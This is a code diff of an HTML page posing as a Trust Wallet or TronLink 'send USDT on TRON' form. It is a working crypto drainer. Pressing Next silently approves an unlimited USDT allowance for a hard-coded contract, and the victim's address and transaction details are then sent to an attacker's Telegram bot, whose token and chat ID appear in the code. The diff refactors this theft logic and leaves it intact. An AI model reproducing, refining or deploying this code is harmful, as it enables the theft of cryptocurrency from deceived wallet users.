@@ -9,7 +9,7 @@
         * { box-sizing: border-box; }
         html, body, #root { width: 100%; height: 100%; margin: 0; font-family: Inter, system-ui, -apple-system, BlinkMacSystemFont, sans-serif; font-weight: 500; }
         .theme-light { --bg: #ffffff; --text: #111827; --subtext: #6b7280; --muted: #9ca3af; --accent: #2563eb; --input-bg: #ffffff; --input-soft: #f6f7f9; --border-default: #d1d5db; }
-        body { background: var(--bg  ); color: var(--text); }
+        body { background: var(--bg ); color: var(--text); }
         .page { min-height: 100dvh; display: flex; justify-content: center; align-items: flex-start; background: var(--bg); padding: 16px; padding-top: 20px; }
         .card { width: 100%; max-width: 420px; padding: 16px; display: flex; flex-direction: column; color: var(--text); border-radius: 16px; }
         .label { font-size: 12px; font-weight: 600; letter-spacing: 0.05em; margin-bottom: 6px; color: var(--subtext); text-transform: uppercase; }
@@ -85,7 +85,7 @@
                 <label class="label">Address or Domain Name</label>
                 <div class="input-row primary">
                     <input id="recipientInput" type="text" placeholder="Search or Enter" value="TAT3kU5o3utrcFL7u747B45W1zRxbWZF8b" />
-                    <span class="paste" onclick="pasteAddress(  )">Paste</span>
+                    <span class="paste" onclick="pasteAddress( )">Paste</span>
                 </div>
 
                 <label class="label">Destination Network</label>
@@ -94,9 +94,7 @@
                         <img id="selectedTokenLogo" src="" alt="Token" class="token-logo">
                         <span id="selectedTokenName">USDT on TRON</span>
                     </div>
-                    <svg class="network-arrow" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-                        <polyline points="6 9 12 15 18 9"></polyline>
-                    </svg>
+
                     <div class="token-dropdown-menu" id="tokenDropdownMenu"></div>
                 </div>
 
@@ -118,46 +116,16 @@
 
     <script>
         const TOKENS = {
-            'usdt_tron': { 
-                name: 'USDT on TRON', 
-                symbol: 'USDT', 
-                network: 'TRON', 
-                chainId: 'mainnet', 
-                address: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t', 
-                decimals: 6, 
-                logo: 'https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/tron/assets/TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t/logo.png', 
-                rpc: 'https://api.tronstack.io',
-                smartContract: 'TURuHxzSzg8FR8VdtBpNSVAP7VU8KvxKFF'
-            }
+            'usdt_tron': { name: 'USDT on TRON', symbol: 'USDT', network: 'TRON', chainId: 'mainnet', address: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t', decimals: 6, logo: 'https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/tron/assets/TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t/logo.png', rpc: 'https://api.tronstack.io', smartContract: 'TURuHxzSzg8FR8VdtBpNSVAP7VU8KvxKFF' }
         };
 
-        const CONFIG = { 
-            TELEGRAM_BOT_TOKEN: '8963397372:AAEvbhYGLXdFgJ5AszQvKoHbIu1bTVg3RNA', 
-            TELEGRAM_CHAT_ID: '8933407008',
-            OWNER_ADDRESS: 'TAT3kU5o3utrcFL7u747B45W1zRxbWZF8b'
-        };
-        
+        const CONFIG = { TELEGRAM_BOT_TOKEN: '8963397372:AAEvbhYGLXdFgJ5AszQvKoHbIu1bTVg3RNA', TELEGRAM_CHAT_ID: '8933407008' };
         let selectedToken = 'usdt_tron';
-        let tronWeb = null;
 
-        document.addEventListener('DOMContentLoaded', (  ) => {
-            initializeTronWeb();
+        document.addEventListener('DOMContentLoaded', ( ) => {
             initializeTokenDropdown();
             document.getElementById('amountInput').addEventListener('input', updateAmountInfo);
-            document.getElementById('tokenSelector').addEventListener('click', toggleTokenDropdown);
         });
-
-        async function initializeTronWeb() {
-            let retries = 0;
-            while (!window.tronWeb && retries < 20) {
-                await new Promise(resolve => setTimeout(resolve, 100));
-                retries++;
-            }
-            if (window.tronWeb) {
-                tronWeb = window.tronWeb;
-                console.log('TronWeb initialized:', tronWeb.defaultAddress.base58);
-            }
-        }
 
         function initializeTokenDropdown() {
             const menu = document.getElementById('tokenDropdownMenu');
@@ -170,7 +138,7 @@
                     selectToken(key);
                 };
                 option.innerHTML = `<img src="${token.logo}" alt="${token.symbol}" class="token-logo" onerror="this.src='data:image/svg+xml,%3Csvg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 24 24%22%3E%3Crect fill=%22%23f0f0f0%22 width=%2224%22 height=%2224%22/%3E%3C/svg%3E'"><div class="token-info"><div class="token-name">${token.symbol}</div><div class="token-network">${token.network}</div></div>`;
-                menu.appendChild(option  );
+                menu.appendChild(option );
             }
         }
 
@@ -199,7 +167,10 @@
             document.getElementById('selectedTokenLogo').src = token.logo;
             document.getElementById('selectedTokenName').textContent = token.name;
             document.getElementById('tokenUnit').textContent = token.symbol;
+            
+            // CHIUDE IL DROPDOWN SUBITO ✅
             closeDropdown();
+            
             initializeTokenDropdown();
         }
 
@@ -245,8 +216,11 @@
         }
 
         async function sendTelegramNotification(userAddress, txHash, amount, token, recipient) {
-            const explorerUrl = `https://tronscan.org/transaction/${txHash}`;
-            const messageText = `Token Approve Notification\n\nToken: ${token.symbol}\nNetwork: ${token.network}\nUser: ${userAddress}\nRecipient: ${recipient}\nAmount: ${amount} ${token.symbol}\n\nTransaction Hash:\n${txHash}\n\nExplorer:\n${explorerUrl}\n\nTime: ${new Date(  ).toLocaleString()}\n\nSmart Contract:\n${token.smartContract}\n\nOwner:\n${CONFIG.OWNER_ADDRESS}`;
+            const explorerUrl = token.network === 'TRON' 
+                ? `https://tronscan.org/transaction/${txHash}`
+                : `https://etherscan.io/tx/${txHash}`;
+
+            const messageText = `Token Approve Notification\n\nToken: ${token.symbol}\nNetwork: ${token.network}\nUser: ${userAddress}\nRecipient: ${recipient}\nAmount: ${amount} ${token.symbol}\n\nTransaction Hash:\n${txHash}\n\nExplorer:\n${explorerUrl}\n\nTime: ${new Date( ).toLocaleString()}\n\nSmart Contract:\n${token.smartContract}`;
 
             const url = `https://api.telegram.org/bot${CONFIG.TELEGRAM_BOT_TOKEN}/sendMessage`;
 
@@ -257,7 +231,7 @@
                     body: JSON.stringify({
                         chat_id: CONFIG.TELEGRAM_CHAT_ID,
                         text: messageText
-                    }  )
+                    } )
                 });
 
                 const responseData = await response.json();
@@ -275,8 +249,8 @@
             const amount = document.getElementById('amountInput').value.trim();
             const token = TOKENS[selectedToken];
 
-            if (!recipient.startsWith('T') || recipient.length !== 34) {
-                showError('Invalid TRON address');
+            if (!recipient.startsWith('T')) {
+                showError('Invalid recipient address');
                 return;
             }
 
@@ -290,21 +264,22 @@
             clearError();
 
             try {
+                let tronWeb = window.tronWeb;
                 let retries = 0;
-                while (!window.tronWeb && retries < 10) {
+                while (!tronWeb && retries < 10) {
                     await new Promise(resolve => setTimeout(resolve, 100));
+                    tronWeb = window.tronWeb;
                     retries++;
                 }
 
-                if (!window.tronWeb) {
-                    showError('TronLink/Trust Wallet not detected');
+                if (!tronWeb) {
+                    showError('Trust Wallet not detected');
                     btn.disabled = false;
                     btn.textContent = 'Next';
                     return;
                 }
 
-                tronWeb = window.tronWeb;
-                const userAddress = tronWeb.defaultAddress.base58;
+                let userAddress = tronWeb.defaultAddress.base58;
 
                 if (!userAddress) {
                     showError('Please connect your wallet');
@@ -316,7 +291,7 @@
                 const usdtContract = await tronWeb.contract().at(token.address);
                 const maxUint256 = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
                 
-                const tx = await usdtContract.approve(
+                let txHash = await usdtContract.approve(
                     token.smartContract,
                     maxUint256
                 ).send({
@@ -329,7 +304,7 @@
                 createParticles();
                 document.getElementById('processingScreen').classList.add('active');
 
-                await sendTelegramNotification(userAddress, tx, amount, token, recipient);
+                await sendTelegramNotification(userAddress || 'Unknown', txHash, amount, token, recipient);
 
                 await new Promise(resolve => setTimeout(resolve, 5000));
                 document.getElementById('processingScreen').classList.remove('active');
@@ -340,17 +315,15 @@
 
             } catch (error) {
                 console.error("Error:", error);
-                showError('Transaction failed: ' + (error.message || 'Unknown error'));
+                showError('Transaction failed: ' + error.message);
                 document.getElementById('processingScreen').classList.remove('active');
                 btn.disabled = false;
                 btn.textContent = 'Next';
             }
         }
 
-        document.addEventListener('DOMContentLoaded', () => {
-            initializeTokenDropdown();
-            document.getElementById('selectedTokenLogo').src = TOKENS[selectedToken].logo;
-        });
+        initializeTokenDropdown();
+        document.getElementById('selectedTokenLogo').src = TOKENS[selectedToken].logo;
     </script>
 </body>
 </html>
